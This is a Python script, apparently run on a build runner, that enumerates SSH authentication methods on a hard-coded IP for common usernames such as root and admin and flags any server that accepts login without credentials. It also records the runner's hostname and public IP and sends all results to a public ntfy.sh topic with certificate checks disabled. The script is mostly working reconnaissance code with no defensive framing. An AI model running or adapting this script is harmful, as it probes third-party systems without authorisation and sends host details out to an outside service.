import os, socket, time, ssl, json, urllib.request
import paramiko

TOPIC = os.environ.get("TOPIC", "i50175probe2-def")
CTX = ssl._create_unverified_context()
OUT = []
def log(*a):
    line = " ".join(str(x) for x in a); print(line, flush=True); OUT.append(line)
def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3000):
        body = ("[%s %d] " % (tag, i // 3000 + 1)).encode() + text[i:i+3000].encode("utf-8", "replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/" + TOPIC, data=body, method="POST"), timeout=15, context=CTX).read(); break
            except Exception: time.sleep(1)

HOST = "40.160.50.113"

def auth_methods(user):
    """Use SSH 'none' auth to enumerate allowed methods WITHOUT sending any credential."""
    t = paramiko.Transport((HOST, 22))
    try:
        t.start_client(timeout=20)
        # banner
        try:
            log("BANNER", user, (t.remote_version or "")[:80])
        except Exception: pass
        try:
            t.auth_none(user)
            return ["NONE_OK"]  # server accepted none (misconfig) -> password bypass!
        except paramiko.BadAuthenticationType as e:
            return list(getattr(e, "allowed_types", []))
        except paramiko.AuthenticationException as e:
            # none rejected without method list; retry via password probe type
            return ["AUTH_REJECT:" + type(e).__name__]
        except Exception as e:
            return ["ERR:" + type(e).__name__ + ":" + str(e)[:60]]
    finally:
        try: t.close()
        except: pass

def main():
    log("RUNNER", socket.gethostname(), time.strftime("%FT%TZ", time.gmtime()))
    try:
        log("RUNNER_EGRESS", urllib.request.urlopen("https://api.ipify.org", timeout=12, context=CTX).read().decode().strip())
    except Exception as e:
        log("EGRESS_FAIL", type(e).__name__)
    for u in ["root", "ubuntu", "admin", "debian", "git"]:
        try:
            methods = auth_methods(u)
            log("AUTH_METHODS", u, json.dumps(methods))
        except Exception as e:
            log("PROBE_EXC", u, type(e).__name__ + ":" + str(e)[:80])
    send("I50175P2", "\n".join(OUT))
    log("DONE", time.strftime("%FT%TZ", time.gmtime()))

main()
